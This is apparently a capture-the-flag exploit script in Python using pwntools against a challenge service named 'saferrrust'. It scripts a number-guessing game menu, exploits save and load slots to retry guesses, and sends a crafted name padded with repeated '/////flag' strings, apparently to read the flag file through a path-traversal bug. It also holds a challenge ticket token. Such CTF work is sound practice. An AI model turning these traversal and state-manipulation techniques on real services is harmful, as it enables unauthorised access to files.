from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "saferrrust-kmelwbhc3nnli.shellweplayaga.me"
    port = 1337
else:
    host = args.host
    port = args.port

ticket = b"ticket{BevelsAutoexec4447n24:hNtCNTsTG7TLXpxQZc5yljU9HwL6GoiXO4vTEMPiCx4m1zfb}"

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

if is_gaibu:
    recvuntil(b"please:")
    sendline(ticket)

def play(lose=False):
    r.sendlineafter(b"MAIN MENU", b"1")
    recvuntil(b"between ")
    lv = recvuntil(b" ")
    recvuntil(b"and ")
    rv = recvuntil(b" ")
    if lose:
        r.sendline(rv)
    else:
        r.sendline(str(random.randint(int(lv) + 1, int(rv) - 1)).encode())
    recvline()
    return b"Correct Number!" in recvline()


def save(slot):
    r.sendlineafter(b"MAIN MENU", b"2")
    r.sendlineafter(b"Select save slot (1 to 3)", str(slot).encode("ascii"))

def load(slot):
    r.sendlineafter(b"MAIN MENU", b"3")
    r.sendlineafter(b"Select save slot (1 to 3)", str(slot).encode("ascii"))

def exit():
    r.sendlineafter(b"MAIN MENU", b"4")

def try_win():
    save(1)
    for i in range(10):
        if play():
            break
        load(1)
# savefile1
name = b"A" * 6 + b"/////flag" * 200
recvuntil(b" your name:")
sendline(name)

try_win()
for i in range(100 - 28):
    play(True)

for i in range(5):
    try_win()
save(1)

save(0)
load(1)
interactive()


#load(1)
#load(2)
#load(3)
#save(2)
#save(3)
interactive()
